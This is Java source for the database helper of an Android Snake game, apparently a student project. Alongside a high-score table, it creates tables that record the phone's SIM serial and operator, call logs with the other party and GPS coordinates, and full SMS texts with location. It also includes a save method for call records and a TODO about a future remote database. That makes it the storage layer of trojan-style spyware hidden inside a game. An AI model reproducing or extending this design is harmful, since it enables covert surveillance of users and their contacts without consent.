package com.example.s1300465.snake;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import java.util.ArrayList;

public class DatabaseHelper extends SQLiteOpenHelper {
    private static final String DATABASE_NAME = "SnakeScores";
    private static final int DATABASE_VERSION = 7;

    public DatabaseHelper(Context context){
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db){
        //Temporary while getting the schema sorted out
        try {
            db.execSQL("DROP TABLE Phones;");
        }catch(Exception ex){}
        try{
            db.execSQL("DROP TABLE PhoneCalls;");
        }catch(Exception ex){}
        try{
            db.execSQL("DROP TABLE SMS;");
        }catch(Exception ex){}

        try {
            db.execSQL("CREATE TABLE LocalScores (Name TEXT, Score INTEGER);");
        }catch(SQLiteException ex){}

        try{
            db.execSQL("CREATE TABLE Phones (Id INTEGER PRIMARY KEY AUTOINCREMENT, SimSerial TEXT, Operator TEXT);");
        }catch(SQLiteException ex){}

        try{
            db.execSQL("CREATE TABLE PhoneCalls (Phone INTEGER, Participant TEXT, Outgoing INTEGER, Time INTEGER, Duration INTEGER, Lat INTEGER, Long INTEGER);");
        }catch(SQLiteException ex){}

        try{
            db.execSQL("CREATE TABLE SMS (Phone INTEGER, Sender TEXT, Receiver TEXT, Time INTEGER, Message TEXT, Type INTEGER, Lat INTEGER, Long INTEGER);");
        }catch(SQLiteException ex){}
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion){
        onCreate(db);
    }

    public void saveLocalScore(String name, int score){
        ContentValues row = new ContentValues();
        row.put("Name", name);
        row.put("Score", score);

        SQLiteDatabase db = this.getWritableDatabase();
        db.insert("LocalScores", null, row);
        db.close();
    }

    public ArrayList<Score> getLocalScores(){
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor result = db.query("LocalScores", new String[]{"Name", "Score"}, null, null, null, null, "Score");

        ArrayList<Score> scores = new ArrayList<>();
        for(int i = 0; i < result.getCount(); i++){
            result.moveToPosition(i);
            scores.add(new Score(result.getString(0), result.getInt(1)));
            Log.d("Score " + i, result.getString(0) + ": " + result.getString(1));
        }

        return scores;
    }

    public void savePhone(String simSerial, String operator){
        //TODO:
        //Once remote DB implemented, fetch the phone's ID once it is set
        //And store in shared preferences
        //Then check if it already has an ID before saving the phone

        SQLiteDatabase dbCheck = this.getReadableDatabase();
        Cursor result = dbCheck.query("Phones", new String[]{"SimSerial"}, null, null, null, null, null);
        if(result.getCount() > 0){
            result.moveToPosition(0);
            if(result.getString(0).equals(simSerial)){
                //Phone being saved is already in local database
                return;
            }
        }
        result.close();

        ContentValues row = new ContentValues();
        row.put("SimSerial", simSerial);
        row.put("Operator", operator);

        SQLiteDatabase db = getWritableDatabase();
        db.insert("Phones", null, row);
        db.close();
    }

    public void savePhoneCall(String participant, boolean outgoing, long duration, long time, int latitude, int longitude){
        ContentValues row = new ContentValues();
        row.put("Phone", 1); //TODO: fetch phone ID from shared prefs
        row.put("Participant", participant);
        row.put("Outgoing", outgoing ? 1: 0);
        row.put("Time", time);
        row.put("Duration", duration);
        row.put("Lat", latitude);
        row.put("Long", longitude);

        SQLiteDatabase db = getWritableDatabase();
        db.insert("PhoneCalls", null, row);
        db.close();
    }

    public ArrayList<Cursor> getData(String Query){
        //get writable database
        SQLiteDatabase sqlDB = this.getWritableDatabase();
        String[] columns = new String[] { "mesage" };
        //an array list of cursor to save two cursors one has results from the query
        //other cursor stores error message if any errors are triggered
        ArrayList<Cursor> alc = new ArrayList<Cursor>(2);
        MatrixCursor Cursor2= new MatrixCursor(columns);
        alc.add(null);
        alc.add(null);


        try{
            String maxQuery = Query ;
            //execute the query results will be save in Cursor c
            Cursor c = sqlDB.rawQuery(maxQuery, null);


            //add value to cursor2
            Cursor2.addRow(new Object[] { "Success" });

            alc.set(1,Cursor2);
            if (null != c && c.getCount() > 0) {


                alc.set(0,c);
                c.moveToFirst();

                return alc ;
            }
            return alc;
        } catch(SQLException sqlEx){
            Log.d("printing exception", sqlEx.getMessage());
            //if any exceptions are triggered save the error message to cursor an return the arraylist
            Cursor2.addRow(new Object[] { ""+sqlEx.getMessage() });
            alc.set(1,Cursor2);
            return alc;
        } catch(Exception ex){

            Log.d("printing exception", ex.getMessage());

            //if any exceptions are triggered save the error message to cursor an return the arraylist
            Cursor2.addRow(new Object[] { ""+ex.getMessage() });
            alc.set(1,Cursor2);
            return alc;
        }


    }
}
